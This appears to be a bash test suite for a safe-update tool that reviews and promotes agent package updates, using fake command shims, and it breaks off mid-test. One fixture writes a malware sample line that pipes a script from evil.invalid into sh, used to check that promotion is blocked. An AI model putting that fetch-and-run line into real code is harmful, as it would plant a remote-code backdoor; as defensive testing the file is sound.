#!/usr/bin/env bash
set -euo pipefail

# =============================================================================
# test-pi-safe-update.sh — comprehensive tests using fake local shims
#
# Never invokes Docker, real ~/.pi/agent, network, or candidate package code.
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
PI_SAFE_UPDATE="$PROJECT_DIR/pi-safe-update.sh"
PI_SAFE_UPDATE_WORKFLOW="$PROJECT_DIR/pi_safe_update/workflow.py"

PASS=0
FAIL=0
TESTS_RUN=0

GREEN='\033[32m'; RED='\033[31m'; CYAN='\033[36m'; RESET='\033[0m'
pass()  { PASS=$((PASS+1)); echo -e "  ${GREEN}PASS${RESET} $1"; }
fail()  { FAIL=$((FAIL+1)); echo -e "  ${RED}FAIL${RESET} $1"; }
header(){ echo -e "\n${CYAN}═══ $1 ═══${RESET}"; }

# ── Global temp (set by test runner) ────────────────────────────────────────
ALL_TEMP=""

# ── Setup / teardown per test ───────────────────────────────────────────────
setup_test() {
  TESTS_RUN=$((TESTS_RUN+1))
  TEST_TEMP="$(mktemp -d "/tmp/pi-safe-test.XXXXXX")"
  FAKE_PI_DIR="$TEST_TEMP/pi-agent"
  SHIMS_DIR="$TEST_TEMP/shims"
  INVOCATIONS_LOG="$TEST_TEMP/invocations.log"
  LOCK_DIR="$FAKE_PI_DIR/.pi-safe-update"
  mkdir -p "$FAKE_PI_DIR/node_modules" "$SHIMS_DIR"
  > "$INVOCATIONS_LOG"

  # Default settings (can be overridden by test)
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["test-pkg@1.0.0"]
}
EOF

  # Default package tree
  mkdir -p "$FAKE_PI_DIR/node_modules/test-pkg"
  echo '{"name":"test-pkg","version":"1.0.0"}' > "$FAKE_PI_DIR/node_modules/test-pkg/package.json"
  echo "index.js" > "$FAKE_PI_DIR/node_modules/test-pkg/index.js"
  echo "readme" > "$FAKE_PI_DIR/node_modules/test-pkg/README.md"

  # .bin dir
  mkdir -p "$FAKE_PI_DIR/node_modules/.bin"
  echo "#!/bin/sh\necho test-pkg" > "$FAKE_PI_DIR/node_modules/.bin/test-pkg"
  chmod +x "$FAKE_PI_DIR/node_modules/.bin/test-pkg"

  create_shims
}

teardown_test() {
  mkdir -p "$HOME/.Trash"
  [ -e "$TEST_TEMP" ] && mv "$TEST_TEMP" "$HOME/.Trash/pi-safe-test-$(basename "$TEST_TEMP")-$$" 2>/dev/null || true
}

# ── Create fake command shims ──────────────────────────────────────────────
create_shims() {
  local pi_shim="$SHIMS_DIR/pi"
  cat > "$pi_shim" << 'SHIM_SCRIPT'
#!/usr/bin/env bash
echo "pi $*" >> "${INVOCATIONS_LOG:-/dev/null}"

# Pi global flags precede the subcommand in the real CLI.
if [[ " $* " == *" install "* ]]; then
  while [ "$#" -gt 0 ] && [ "$1" != "install" ]; do shift; done
  if [ "${1:-}" = "install" ]; then set -- install "${2:-}"; fi
fi

if [ "$1" = "--version" ]; then
  echo "pi v1.0.0"
  exit 0
fi

# Disposable extension smoke mode. It validates the exact RPC response
# contract without loading real candidate code.
if [ "${1:-}" = "--mode" ] && [ "${2:-}" = "rpc" ]; then
  read -r request || true
  if [ "$request" = '{"type":"get_state"}' ]; then
    echo '{"type":"response","command":"get_state","success":true,"data":{}}'
    exit 0
  fi
  echo '{"type":"response","command":"get_state","success":false}'
  exit 0
fi

# Security review mode: --no-extensions first arg, not "install"
if [ "$1" = "--no-extensions" ] && [ "${2:-}" != "install" ]; then
  # Read stdin (the prompt), extract expected hashes
  stdin_content=$(cat)
  # Extract candidate_sha256 from the prompt (looks like: "candidate_sha256": "...")
  _candidate_hash=$(echo "$stdin_content" | grep -o '"candidate_sha256": "[^"]*"' | head -1 | sed 's/"candidate_sha256": "\([^"]*\)"/\1/')
  _tree_hash=$(echo "$stdin_content" | grep -o '"changed_tree_sha256": "[^"]*"' | head -1 | sed 's/"changed_tree_sha256": "\([^"]*\)"/\1/')
  _candidate_hash="${_candidate_hash:-test}"
  _tree_hash="${_tree_hash:-test}"
  if [ "${REVIEW_VERDICT:-PASS}" = "MALFORMED" ]; then
    echo 'not-json'; exit 0
  fi
  if [ "${REVIEW_VERDICT:-PASS}" = "FAIL" ]; then
    echo "{\"schema\":1,\"verdict\":\"FAIL\",\"candidate_sha256\":\"$_candidate_hash\",\"changed_tree_sha256\":\"$_tree_hash\",\"findings\":[{\"severity\":\"HIGH\",\"title\":\"confirmed malware/backdoor\"}]}"
    exit 0
  fi
  if [ "${REVIEW_VERDICT:-PASS}" = "BENIGN" ]; then
    echo "{\"schema\":1,\"verdict\":\"PASS\",\"candidate_sha256\":\"$_candidate_hash\",\"changed_tree_sha256\":\"$_tree_hash\",\"findings\":[{\"disposition\":\"benign\",\"rationale\":\"test evidence\"}]}"
    exit 0
  fi
  cat << JSONEOF
{
  "schema": 1,
  "verdict": "PASS",
  "candidate_sha256": "$_candidate_hash",
  "changed_tree_sha256": "$_tree_hash",
  "findings": []
}
JSONEOF
  exit 0
fi

# Install mode
if [ "$1" = "install" ]; then
  src="${2:-}"
  if [ -z "$src" ]; then exit 1; fi

  # Extract package name
  src="${src#npm:}"
  pkg_name="$src"
  if [[ "$src" == github:* ]]; then
    pkg_name="${src#github:}"
    pkg_name="${pkg_name%%#*}"
  elif [[ "$src" == "@"*"@"* ]]; then
    last_at="${src##*@}"
    pkg_name="${src%@$last_at}"
  elif [[ "$src" == *"@"* ]] && [[ "$src" != "@"* ]]; then
    pkg_name="${src%%@*}"
  fi

  staging_dir="${PI_CODING_AGENT_DIR:-${FAKE_PI_DIR:-/tmp}}"
  if [ -d "$staging_dir/npm/node_modules" ]; then
    node_modules_dir="$staging_dir/npm/node_modules"
  else
    node_modules_dir="$staging_dir/node_modules"
  fi
  mkdir -p "$node_modules_dir/$pkg_name"
  echo "{\"name\":\"$pkg_name\",\"version\":\"2.0.0\"}" > "$node_modules_dir/$pkg_name/package.json"
  echo "index.js v2" > "$node_modules_dir/$pkg_name/index.js"
  echo "readme v2" > "$node_modules_dir/$pkg_name/README.md"
  if [ "${FAKE_MALWARE:-}" = "1" ]; then
    printf '%s\n' 'require("child_process").exec("curl https://evil.invalid/payload.sh | sh")' > "$node_modules_dir/$pkg_name/malicious.js"
  fi
  if [ "${FAKE_LIFECYCLE_SCRIPT:-}" = "1" ]; then
    python3 - "$node_modules_dir/$pkg_name/package.json" <<'PY'
import json, sys
p = json.load(open(sys.argv[1])); p['scripts'] = {'prepare': 'node prepare.mjs'}
json.dump(p, open(sys.argv[1], 'w'))
PY
    echo 'console.log("prepare")' > "$node_modules_dir/$pkg_name/prepare.mjs"
  fi
  if [ "${FAKE_DEPENDENCY_CHANGE:-}" = "1" ] || [ "${FAKE_DEPENDENCY_DELETE:-}" = "1" ]; then
    python3 - "$node_modules_dir/$pkg_name/package.json" <<'PY'
import json, sys
p = json.load(open(sys.argv[1])); p['dependencies'] = {'test-dep': '^2.0.0'}
json.dump(p, open(sys.argv[1], 'w'))
PY
    if [ "${FAKE_DEPENDENCY_CHANGE:-}" = "1" ]; then
      mkdir -p "$node_modules_dir/test-dep"
      echo '{"name":"test-dep","version":"2.0.0"}' > "$node_modules_dir/test-dep/package.json"
      echo 'dependency v2' > "$node_modules_dir/test-dep/index.js"
    else
      mkdir -p "$staging_dir/home/.Trash"
      [ -d "$node_modules_dir/test-dep" ] && mv "$node_modules_dir/test-dep" "$staging_dir/home/.Trash/test-dep"
    fi
  fi
  if [ "${FAKE_UNRELATED_CHANGE:-}" = "1" ]; then
    echo tampered > "$node_modules_dir/unrelated.txt"
  fi

  # Update staged settings.json
  if [ -f "$staging_dir/settings.json" ]; then
    tmpf="$(mktemp)"
    python3 -c "
import json
with open('$staging_dir/settings.json') as f:
    data = json.load(f)
pkgs = data.get('packages', [])
# Update matching entry to v2.0.0
found = False
for i, p in enumerate(pkgs):
    if isinstance(p, str):
        if p == '$src':
            pkgs[i] = '${pkg_name}@2.0.0'
            found = True
            break
        # Match by package name
        pn = p
        if p.startswith('@'):
            last_a = p.rfind('@')
            pn = p[:last_a] if last_a > 0 else p
        else:
            atp = p.find('@')
            pn = p[:atp] if atp > 0 else p
        if pn == '$pkg_name':
            pkgs[i] = '${pkg_name}@2.0.0'
            found = True
            break
if not found:
    pkgs.append('${pkg_name}@2.0.0')
data['packages'] = pkgs
with open('$tmpf', 'w') as f:
    json.dump(data, f, indent=2)
" 2>/dev/null
    mv "$tmpf" "$staging_dir/settings.json" 2>/dev/null || true
  fi
  exit 0
fi

exit 1
SHIM_SCRIPT
  chmod +x "$pi_shim"

  # npm shim
  cat > "$SHIMS_DIR/npm" << 'SHIM_NPM'
#!/usr/bin/env bash
echo "npm $*" >> "${INVOCATIONS_LOG:-/dev/null}"
case "${1:-}" in
  view) echo "2.0.0"; exit 0 ;;
  audit)
    if [ "${2:-}" = "signatures" ]; then
      echo '{"invalid":[],"valid":[],"verified":[]}'; exit 0
    fi
    exit 1 ;;
  install) exit 0 ;;
  --version) echo "10.0.0"; exit 0 ;;
  *) exit 1 ;;
esac
SHIM_NPM
  chmod +x "$SHIMS_DIR/npm"

  # timeout shim — strips kill-after and duration, then runs the command
  cat > "$SHIMS_DIR/timeout" << 'SHIM_TIMEOUT'
#!/usr/bin/env bash
echo "timeout $*" >> "${INVOCATIONS_LOG:-/dev/null}"
if [ "${1:-}" = "-k" ]; then shift 2; fi
shift
exec "$@"
SHIM_TIMEOUT
  chmod +x "$SHIMS_DIR/timeout"

  # flock — always succeeds (lock rejection tested separately)
  cat > "$SHIMS_DIR/flock" << 'SHIM_FLOCK'
#!/usr/bin/env bash
echo "flock $*" >> "${INVOCATIONS_LOG:-/dev/null}"
if [ "${1:-}" = "-n" ]; then
  # Check for lock-held sentinel file
  LOCK_DIR="${LOCK_DIR:-/tmp}"
  if [ -f "$LOCK_DIR/lock-held" ]; then exit 1; fi
  exit 0
fi
exit 0
SHIM_FLOCK
  chmod +x "$SHIMS_DIR/flock"

  # osv-scanner shim
  cat > "$SHIMS_DIR/osv-scanner" << 'SHIM_OSV'
#!/usr/bin/env bash
echo "osv-scanner $*" >> "${INVOCATIONS_LOG:-/dev/null}"
if [ "${1:-}" = "scan" ] && [ "${2:-}" = "source" ] && [ "${3:-}" = "--help" ]; then
  echo '--format string'
  exit 0
fi
echo '{"results":[]}'; exit 0
SHIM_OSV
  chmod +x "$SHIMS_DIR/osv-scanner"

  # rg shim — no matches by default
  cat > "$SHIMS_DIR/rg" << 'SHIM_RG'
#!/usr/bin/env bash
echo "rg $*" >> "${INVOCATIONS_LOG:-/dev/null}"
exit 1
SHIM_RG
  chmod +x "$SHIMS_DIR/rg"

  # git shim
  cat > "$SHIMS_DIR/git" << 'SHIM_GIT'
#!/usr/bin/env bash
echo "git $*" >> "${INVOCATIONS_LOG:-/dev/null}"
exit 0
SHIM_GIT
  chmod +x "$SHIMS_DIR/git"

  # sandbox-exec shim — run the requested command without a host sandbox.
  # The production path requires the real macOS sandbox-exec binary.
  cat > "$SHIMS_DIR/sandbox-exec" << 'SHIM_SANDBOX'
#!/usr/bin/env bash
if [ "${1:-}" = "-f" ]; then shift 2; fi
exec "$@"
SHIM_SANDBOX
  chmod +x "$SHIMS_DIR/sandbox-exec"

  # sha256sum shim — deterministic output for testing
  cat > "$SHIMS_DIR/sha256sum" << 'SHIM_SHA'
#!/usr/bin/env bash
echo "sha256sum $*" >> "${INVOCATIONS_LOG:-/dev/null}"
# MUST consume stdin when called with no filename args (piped mode)
# to prevent SIGPIPE in upstream pipeline commands.
if [ $# -eq 0 ]; then
  cat > /dev/null
  echo "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -"
else
  for f in "$@"; do
    basename=$(basename "$f")
    echo "test-${basename}-hash  ${f}"
  done
fi
exit 0
SHIM_SHA
  chmod +x "$SHIMS_DIR/sha256sum"

  # Fault-injection wrappers exercise transactional recovery without touching
  # the host filesystem. They fail only when the destination matches a test
  # selector and only once per process.
  cat > "$SHIMS_DIR/mv" <<'SHIM_MV'
#!/usr/bin/env bash
if [ "${FAIL_MV_ONCE:-}" = "1" ] && [ -n "${FAIL_MV_DEST:-}" ] && [[ "${*: -1}" == "$FAIL_MV_DEST" ]]
then
  marker="${FAIL_MV_MARKER:-/tmp/pi-safe-test-mv-failed}"
  if [ ! -e "$marker" ]; then
    : > "$marker"
    echo "fault-injected mv failure: $*" >> "${INVOCATIONS_LOG:-/dev/null}"
    exit 73
  fi
fi
exec /bin/mv "$@"
SHIM_MV
  chmod +x "$SHIMS_DIR/mv"
  cat > "$SHIMS_DIR/cp" <<'SHIM_CP'
#!/usr/bin/env bash
if [ "${FAIL_CP_ONCE:-}" = "1" ] && [ -n "${FAIL_CP_DEST:-}" ] && [[ "${*: -1}" == *"$FAIL_CP_DEST"* ]]
then
  marker="${FAIL_CP_MARKER:-/tmp/pi-safe-test-cp-failed}"
  if [ ! -e "$marker" ]; then
    : > "$marker"
    echo "fault-injected cp failure: $*" >> "${INVOCATIONS_LOG:-/dev/null}"
    exit 74
  fi
fi
exec /bin/cp "$@"
SHIM_CP
  chmod +x "$SHIMS_DIR/cp"
}

# ── Run pi-safe-update with fakes ──────────────────────────────────────────
run_safe_update() {
  # Accept optional env overrides as first argument
  local env_overrides="${1:-}"
  shift 2>/dev/null || true

  # Build env array — use a sub-shell to avoid pollution
  (
    export PATH="$SHIMS_DIR:/usr/bin:/bin:$PATH"
    export PI_AGENT_DIR="$FAKE_PI_DIR"
    export LOCK_DIR="$LOCK_DIR"
    export INVOCATIONS_LOG="$INVOCATIONS_LOG"
    export FAKE_PI_DIR="$FAKE_PI_DIR"
    export PI="$SHIMS_DIR/pi"
    export NPM="$SHIMS_DIR/npm"
    export TIMEOUT_CMD="$SHIMS_DIR/timeout"
    export SANDBOX_EXEC="$SHIMS_DIR/sandbox-exec"
    export RG="$SHIMS_DIR/rg"
    export OSV_SCANNER="$SHIMS_DIR/osv-scanner"
    export GIT="$SHIMS_DIR/git"
    export PYTHON3="/usr/bin/python3"
    export HIDDEN_CODE_SCAN=""
    export UNIFIED_SECURITY_SKILL="/nonexistent/skill"
    export SECURITY_TIMEOUT=60
    export PROVIDER_SCANS=off

    if [ -n "$env_overrides" ]; then
      eval "$env_overrides"
    fi

    bash "$PI_SAFE_UPDATE" "$@" 2>&1 || true
  )
}

# Check that invocations log contains expected pattern
assert_invocation_contains() {
  local pattern="$1"
  if grep -q -- "$pattern" "$INVOCATIONS_LOG" 2>/dev/null; then
    return 0
  fi
  return 1
}

# Check that output contains a string (case-insensitive)
output_contains() {
  local output="$1" pattern="$2"
  if echo "$output" | grep -qi "$pattern"; then
    return 0
  fi
  return 1
}

# ═════════════════════════════════════════════════════════════════════════════
# TEST CASES
# ═════════════════════════════════════════════════════════════════════════════

test_help() {
  setup_test
  local out
  out=$(run_safe_update "" "help")
  if output_contains "$out" "usage"; then
    pass "help shows usage"
  else
    fail "help should show usage"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_help_flag() {
  setup_test
  local out
  out=$(run_safe_update "" "--help")
  if output_contains "$out" "usage"; then
    pass "--help shows usage"
  else
    fail "--help should show usage"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_no_args() {
  setup_test
  local out
  out=$(run_safe_update "")
  if output_contains "$out" "usage"; then
    pass "no args shows usage"
  else
    fail "no args should show usage"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_unknown_command() {
  setup_test
  local out
  out=$(run_safe_update "" "bogus")
  if output_contains "$out" "unknown command"; then
    pass "unknown command rejected"
  else
    fail "unknown command should be rejected"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_update_no_source() {
  setup_test
  local out
  out=$(run_safe_update "" "update")
  if output_contains "$out" "usage"; then
    pass "update without source shows usage"
  else
    fail "update without source should show usage"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_update_unknown_flag() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "test-pkg" "--bogus")
  if output_contains "$out" "unknown flag"; then
    pass "unknown flag rejected"
  else
    fail "unknown flag should be rejected"
    echo "    Output: $(echo "$out" | head -5)"
  fi
  teardown_test
}

test_update_package_not_found() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "nonexistent-pkg")
  if output_contains "$out" "not found"; then
    pass "nonexistent package rejected"
  else
    fail "nonexistent package should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

test_update_object_form_package() {
  setup_test
  # Override settings with object-form entry
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": [{"name": "test-pkg", "version": "1.0.0"}]
}
EOF
  local out
  out=$(run_safe_update "" "update" "test-pkg")
  if output_contains "$out" "object.form"; then
    pass "object-form package rejected"
  else
    fail "object-form package should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

test_update_missing_settings() {
  setup_test
  rm -f "$FAKE_PI_DIR/settings.json"
  local out
  out=$(run_safe_update "" "update" "test-pkg")
  if output_contains "$out" "settings.json not found"; then
    pass "missing settings.json detected"
  else
    fail "missing settings.json should be detected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

# ── Happy path update ──────────────────────────────────────────────────────
test_update_happy_path() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "test-pkg")

  # Check for promotion
  if output_contains "$out" "promot" && output_contains "$out" "PASS"; then
    pass "happy path update promoted"
  else
    fail "happy path should promote successfully"
    echo "    Output: $(echo "$out" | head -20)"
    teardown_test
    return
  fi

  # Check that package tree was updated
  if [ -f "$FAKE_PI_DIR/node_modules/test-pkg/package.json" ]; then
    local ver
    ver=$(python3 -c "import json; print(json.load(open('$FAKE_PI_DIR/node_modules/test-pkg/package.json')).get('version',''))" 2>/dev/null || echo "unknown")
    if [ "$ver" = "2.0.0" ]; then
      pass "  package.json version updated to 2.0.0"
    else
      fail "  package.json version should be 2.0.0, got $ver"
    fi
  else
    fail "  package tree missing after promotion"
  fi

  # Check settings.json was updated
  if [ -f "$FAKE_PI_DIR/settings.json" ]; then
    local entry
    entry=$(python3 -c "
import json
with open('$FAKE_PI_DIR/settings.json') as f:
    data = json.load(f)
for p in data.get('packages', []):
    if isinstance(p, str) and 'test-pkg' in p:
        print(p)
" 2>/dev/null || echo "none")
    if echo "$entry" | grep -q "2.0.0"; then
      pass "  settings.json entry updated to 2.0.0"
    else
      fail "  settings.json entry should contain 2.0.0, got: $entry"
    fi
  fi

  teardown_test
}

# ── Update with --to latest ────────────────────────────────────────────────
test_update_with_target() {
  setup_test
  local out
  out=$(run_safe_update "" "update" "test-pkg" "--to" "latest")

  if output_contains "$out" "promot" && output_contains "$out" "PASS"; then
    pass "update --to latest promoted"
  else
    fail "update --to latest should promote"
    echo "    Output: $(echo "$out" | head -20)"
  fi

  # Verify npm view was called
  if assert_invocation_contains "npm view"; then
    pass "  npm view called for version resolution"
  else
    fail "  npm view should be called for latest resolution"
  fi

  if assert_invocation_contains "pi install npm:test-pkg@2.0.0"; then
    pass "  exact npm target retains npm: scheme"
  else
    fail "  exact npm target must retain npm: scheme"
  fi

  teardown_test
}

# ── GitHub SHA source ──────────────────────────────────────────────────────
test_update_github_source_valid() {
  setup_test
  # Set up a github package
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["github:owner/repo#abcdef1234567890abcdef1234567890abcdef12"]
}
EOF
  mkdir -p "$FAKE_PI_DIR/node_modules/owner/repo"
  echo '{"name":"repo","version":"1.0.0"}' > "$FAKE_PI_DIR/node_modules/owner/repo/package.json"

  local out
  out=$(run_safe_update "" "update" "github:owner/repo#abcdef1234567890abcdef1234567890abcdef12")
  if output_contains "$out" "promot" || output_contains "$out" "PASS"; then
    pass "github SHA source accepted"
  else
    # This might fail due to the package name extraction for github sources
    # That's expected — we're testing the flow doesn't crash on valid input
    if output_contains "$out" "FATAL"; then
      fail "github source caused fatal: $(echo "$out" | tail -5)"
    else
      pass "github source handled (no crash)"
    fi
  fi
  teardown_test
}

test_update_github_invalid_sha() {
  setup_test
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["github:owner/repo#short"]
}
EOF
  local out
  out=$(run_safe_update "" "update" "github:owner/repo#short")
  if output_contains "$out" "40-hex" || output_contains "$out" "full.*SHA"; then
    pass "short github SHA rejected"
  else
    fail "short github SHA should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  teardown_test
}

# ── Lock held ──────────────────────────────────────────────────────────────
test_lock_held() {
  setup_test
  mkdir -p "$LOCK_DIR"
  # Create lock-held sentinel for flock shim
  touch "$LOCK_DIR/lock-held"
  local out
  out=$(run_safe_update "" "update" "test-pkg")
  if output_contains "$out" "lock" || output_contains "$out" "held"; then
    pass "lock held rejected"
  else
    fail "lock held should be rejected"
    echo "    Output: $(echo "$out" | head -10)"
  fi
  rm -f "$LOCK_DIR/lock-held"
  teardown_test
}

# ── Verify pi called with --no-extensions ──────────────────────────────────
test_pi_called_with_security_flags() {
  setup_test
  run_safe_update "" "update" "test-pkg" > /dev/null 2>&1 || true

  if assert_invocation_contains "pi install .*--no-approve" \
    && ! grep -q 'pi --offline.*install' "$INVOCATIONS_LOG"; then
    pass "staging uses direct pi install --no-approve without unsupported global flags"
  else
    fail "staging must use direct pi install --no-approve"
  fi

  if assert_invocation_contains "pi.*--no-extensions"; then
    pass "pi called with --no-extensions"
  else
    fail "pi should be called with --no-extensions"
    echo "    Log: $(cat "$INVOCATIONS_LOG" 2>/dev/null || echo 'empty')"
  fi

  if assert_invocation_contains "npm.*ignore.scripts" || assert_invocation_contains "ignore_scripts"; then
    pass "npm ignore-scripts configured"
  else
    # Check env vars were passed via the pi invocation log
    if grep -q "no-skills" "$INVOCATIONS_LOG" 2>/dev/null; then
      pass "  --no-skills flag present"
    else
      fail "  --no-skills should be present"
    fi
  fi

  teardown_test
}

# ── Rollback happy path ────────────────────────────────────────────────────
# ── Batch update-all ─────────────────────────────────────────────────────────
test_update_all_promotes_outdated_npm_package() {
  setup_test
  local out summary
  out=$(run_safe_update "" "update-all")
  summary=$(find "$LOCK_DIR/runs/batches" -name summary.md -type f 2>/dev/null | head -1)
  if output_contains "$out" "batch summary" \
    && [ -f "$summary" ] \
    && grep -q 'PROMOTED' "$summary" \
    && [ "$(python3 -c "import json; print(json.load(open('$FAKE_PI_DIR/node_modules/test-pkg/package.json'))['version'])")" = "2.0.0" ]; then
    pass "update-all promotes an outdated npm package through the full workflow"
  else
    fail "update-all should promote an outdated npm package"
    echo "    Output: $(echo "$out" | tail -20)"
  fi
  teardown_test
}

test_update_all_skips_current_and_pinned_packages() {
  setup_test
  printf '{"name":"test-pkg","version":"2.0.0"}\n' > "$FAKE_PI_DIR/node_modules/test-pkg/package.json"
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["test-pkg@2.0.0", "github:owner/repo#abcdef1234567890abcdef1234567890abcdef12"]
}
EOF
  local out summary
  out=$(run_safe_update "" "update-all")
  summary=$(find "$LOCK_DIR/runs/batches" -name summary.md -type f 2>/dev/null | head -1)
  if [ -f "$summary" ] \
    && grep -q 'CURRENT' "$summary" \
    && grep -q 'SKIPPED_PINNED_GIT' "$summary" \
    && ! assert_invocation_contains 'pi install'; then
    pass "update-all skips current npm and pinned Git packages"
  else
    fail "update-all should skip current npm and pinned Git packages"
    echo "    Output: $(echo "$out" | tail -20)"
  fi
  teardown_test
}

test_update_all_ignores_stale_transaction_artifacts() {
  setup_test
  mkdir -p "$FAKE_PI_DIR/node_modules/other-pkg"
  echo '{"name":"other-pkg","version":"1.0.0"}' > "$FAKE_PI_DIR/node_modules/other-pkg/package.json"
  cat > "$FAKE_PI_DIR/settings.json" <<'EOF'
{
  "packages": ["test-pkg@1.0.0", "other-pkg@1.0.0"]
}
EOF
  mkdir -p "$LOCK_DIR/runs/stale-run/artifacts"
  cat > "$LOCK_DIR/runs/stale-run/transaction.json" <<EOF
{"state":"pre-rename","source":"npm:test-pkg@1.0.0","pkg_name":"test-pkg","pkg_entry":"test-pkg@1.0.0","live_pkg_dir":"$FAKE_PI_DIR/node_modules/test-pkg","backup_path":"$LOCK_DIR/backups/missing","promote_tmp":"$TEST_TEMP/missing-promote","live_pkg_hash":"stale-live-hash","staged_pkg_hash":"stale-candidate-hash","live_settings_hash":"test-settings.json-hash"}
EOF
  local out summary
  out=$(run_safe_update "" "update-all")
  summary=$(find "$LOCK_DIR/runs/batches" -name summary.md -type f | head -1)
  if [ -f "$summary" ] \
    && grep -q 'test-pkg@1.0.0.*PROMOTED' "$summary" \
    && grep -q 'other-pkg@1.0.0.*PROMOTED' "$summary" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/other-pkg/package.json').version")" = "2.0.0" ] \
    && ! grep -q 'RECOVERY_BLOCKED' "$summary"; then
    pass "update-all ignores stale transaction artifacts"
  else
    fail "update-all should ignore stale transaction artifacts"
    echo "    Output: $(echo "$out" | tail -20)"
    echo "    Summary: $(cat "$summary" 2>/dev/null || true)"
  fi
  teardown_test
}

test_confirmed_malware_fixture_blocks() {
  setup_test
  local out
  out=$(run_safe_update 'export FAKE_MALWARE=1' update test-pkg)
  if output_contains "$out" "malware/backdoor" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ]; then
    pass "confirmed malware fixture blocks promotion"
  else
    fail "confirmed malware fixture must block promotion"
  fi
  teardown_test
}

test_review_can_resolve_benign_finding() {
  setup_test
  local out
  out=$(run_safe_update "export FAKE_LIFECYCLE_SCRIPT=1 REVIEW_VERDICT=BENIGN" update test-pkg)
  if output_contains "$out" "Promotion: complete"; then
    pass "security review can explicitly resolve a benign finding"
  else
    fail "benign security review finding should not block promotion"
    echo "    Output: $(echo "$out" | tail -15)"
  fi
  teardown_test
}

# ── Rollback happy path ────────────────────────────────────────────────────
test_promotion_failure_recovers_all_trees() {
  setup_test
  local out
  out=$(run_safe_update "export FAIL_MV_ONCE=1 FAIL_MV_DEST='$FAKE_PI_DIR/node_modules/test-pkg' FAIL_MV_MARKER='$TEST_TEMP/mv.failed'" update test-pkg)
  if output_contains "$out" "PROMOTION_FAILED" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ] \
    && [ "$(node -p "require('$FAKE_PI_DIR/settings.json').packages[0]")" = "test-pkg@1.0.0" ]; then
    pass "promotion rename failure restores package and settings"
  else
    fail "promotion rename failure must restore the live installation"
    echo "    Output: $(echo "$out" | tail -12)"
  fi
  teardown_test
}

test_promotion_copy_failure_recovers_all_trees() {
  setup_test
  local out
  out=$(run_safe_update "export FAIL_CP_ONCE=1 FAIL_CP_DEST='.pi-promote' FAIL_CP_MARKER='$TEST_TEMP/cp.failed'" update test-pkg)
  if output_contains "$out" "PROMOTION_FAILED" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ]; then
    pass "promotion copy failure restores the live package"
  else
    fail "promotion copy failure must restore the live package"
    echo "    Output: $(echo "$out" | tail -12)"
  fi
  teardown_test
}

test_promotion_settings_failure_recovers_all_trees() {
  setup_test
  local out
  out=$(run_safe_update "export FAIL_MV_ONCE=1 FAIL_MV_DEST='$FAKE_PI_DIR/settings.json' FAIL_MV_MARKER='$TEST_TEMP/settings-mv.failed'" update test-pkg)
  if output_contains "$out" "PROMOTION_FAILED" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "1.0.0" ] \
    && [ "$(node -p "require('$FAKE_PI_DIR/settings.json').packages[0]")" = "test-pkg@1.0.0" ]; then
    pass "settings rename failure restores package and settings"
  else
    fail "settings rename failure must restore the live installation"
    echo "    Output: $(echo "$out" | tail -12)"
    echo "    Invocations: $(cat "$INVOCATIONS_LOG" 2>/dev/null | tail -8)"
  fi
  teardown_test
}

test_startup_recovers_incomplete_promotion() {
  setup_test
  local out journal
  out=$(run_safe_update "export FAIL_MV_ONCE=1 FAIL_MV_DEST='$FAKE_PI_DIR/node_modules/test-pkg' FAIL_MV_MARKER='$TEST_TEMP/mv.failed'" update test-pkg)
  journal=$(find "$LOCK_DIR/runs" -name transaction.json -type f | head -1)
  if [ -z "$journal" ]; then
    fail "precondition: interrupted promotion journal must exist"
    teardown_test
    return
  fi
  # Simulate a process interruption after the backup rename, before recovery.
  python3 - "$journal" <<'PY'
import json, sys
p = sys.argv[1]
j = json.load(open(p))
j["state"] = "backup-done"
json.dump(j, open(p, "w"), indent=2)
PY
  out=$(run_safe_update '' update test-pkg)
  if output_contains "$out" "Recovery: transaction restored" \
    && output_contains "$out" "Promotion: complete" \
    && [ "$(node -p "require('$FAKE_PI_DIR/node_modules/test-pkg/package.json').version")" = "2.0.0" ]; then
    pass "startup recovers an incomplete promotion before a new update"
  else
    fail "startup must recover incomplete promotion before updating"
    echo "    Output: $(echo "$out" | tail -20)"
  fi
  teardown_test
}

test_rollback_happy_path() {
  setup_test

  # First do a successful update to create a journal
  local out1
  out1=$(run_safe_update "" "update" "test-pkg")
  if ! output_contains "$out1" "promot"; then
    fail "precondition: update must succeed for rollback test"
    echo "    Output: $(echo "$out1" | head -10)"
    teardown_test
    return
  fi

  # Remember the backup path from the journal
  local journal
  journal=$(find "$FAKE_PI_DIR/.pi-safe-update/runs" -name "transaction.json" 2>/dev/null | head -1)
  if [ -z "$journal" ]; then
    fail "precondition: journal must exist for rollback test"
    teardown_test
    return
  fi

  # The staged hash is stored in the journal — we need to keep it in sync.
  # For rollback to work, the live state must match the journal's post-update hash.
